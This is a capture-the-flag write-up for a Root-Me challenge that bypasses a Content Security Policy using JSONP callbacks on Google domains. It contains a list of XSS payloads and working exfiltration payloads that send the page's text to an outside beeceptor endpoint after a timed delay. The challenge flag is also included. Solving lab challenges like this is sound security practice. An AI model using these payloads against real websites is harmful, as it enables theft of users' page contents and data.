# CSP Bypass Nonce

## Description

Exfiltrate the content of the page!

[Start the challenge](http://challenge01.root-me.org/web-client/ch28/)

## Solution

[w3 JSONP](https://www.w3schools.com/JS/js_json_jsonp.asp): JSONP bypasses cross-domain restrictions by using a `<script>` tag instead of `XMLHttpRequest`.

Yet again it's possible to inject anything into HTML. [Hacktricks > Content Security Policy (CSP) Bypass > Third Party Endpoints + JSONP](https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html#third-party-endpoints--jsonp)

![csp-bypass---jsonp.png](/assets/ctf/root-me/csp-bypass-jsonp.png)

[https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com)
```bash
default-src 'self' https://*.google.com https://*.googleapis.com https://*.twitter.com; connect-src 'none'; font-src 'none'; frame-src 'none'; img-src 'self'; manifest-src 'none'; media-src 'none'; object-src 'none'; style-src 'self'; worker-src 'none'; frame-ancestors 'none'; block-all-mixed-content;
```

![csp-bypass---jsonp-1.png](/assets/ctf/root-me/csp-bypass-jsonp-1.png)

Following payload works [https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques](https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques) (Scenario : 6)
```html 
<script src="https://www.google.com/complete/search?client=chrome&q=XSS&callback=alert#1"></script>
```

![csp-bypass---jsonp-2.png](/assets/ctf/root-me/csp-bypass-jsonp-2.png)

But it's not working as intended, query is passed to callback as parameter..
```html
<script src="https://www.google.com/complete/search?client=chrome&q=https://uwuos.free.beeceptor.com&callback=fetch#1"></script>
```

![csp-bypass---jsonp-3.png](/assets/ctf/root-me/csp-bypass-jsonp-3.png)

Payloads
1. [JSONBee](https://github.com/zigoo0/JSONBee)
2. [CSPBypass](https://github.com/renniepak/CSPBypass)

```html
#Google.com:
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)"></script>
"><script src="https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)"></script>
"><script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>
"><script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
"><script src="https://maps.googleapis.com/maps/api/js?key=[REPLACE_BY_GOOGLE_API_KEY_FROM_CURRENT_WEBSITE]&callback=alert(1337)"></script>
```

Following worked and popped an alert
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
```

After experimenting I was not able to get direct Javascript execution, because I was doing `callback=JAVASCRIPT_HERE` and JSONP didn't like that since code was not a function. Quick patch was to use `callback=console.log(1);JAVASCRIPT_CODE;` which worked nicely.

Then I tried using `fetch`, but it's blocked via CORS.

Then I tried `document.location='http://YOUR_ENDPOINT?'.concat(document.querySelector('.message').firstElementChild.textContent)`, but `document` was always `Hello !`. This was odd because full html should have been rendered? Unless... there was a delay for document to load and `document.location` was faster then HTML loading speed!

`setTimeout` to the rescue with `sleep` like functionality.

![csp-bypass---jsonp-4.png](/assets/ctf/root-me/csp-bypass-jsonp-4.png)

Payloads:
```html
<!-- Test -->
<script src="https://www.googleapis.com/customsearch/v1?callback=console.log(1);setTimeout(function(){console.log('https://uwuos.free.beeceptor.com?'.concat(document.body.innerText))},3000);"></script>

<!-- Exfiltrate -->
<script src="https://www.googleapis.com/customsearch/v1?callback=console.log(1);setTimeout(function(){document.location='https://uwuos.free.beeceptor.com?'.concat(document.querySelector('.message').firstElementChild.textContent)},3000);"></script>

<!-- URL
http://challenge01.root-me.org:58028/page?user=<script+src%3D"https%3A%2F%2Fwww.googleapis.com%2Fcustomsearch%2Fv1%3Fcallback%3Dconsole.log%281%29%3BsetTimeout%28function%28%29%7Bdocument.location%3D%27https%3A%2F%2Fuwuos.free.beeceptor.com%3F%27.concat%28document.querySelector%28%27.message%27%29.firstElementChild.textContent%29%7D%2C3000%29%3B"><%2Fscript>
-->
```

After sending the payload on `/report` (like 2-3minutes) we got a callback 🎉

![csp-bypass---jsonp-5.png](/assets/ctf/root-me/csp-bypass-jsonp-5.png)

::: tip Flag
`CSP_4ND_JS0NP_ENDPOINT_B4D_ID3A`
:::

::: info Note
[Dragunov](https://www.root-me.org/Dragunov?lang=en "profil of Dragunov") mentioned that `async` and `defer` attributes could have been used to load scripts after the content is loaded, [docs](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script)
:::


Dragunov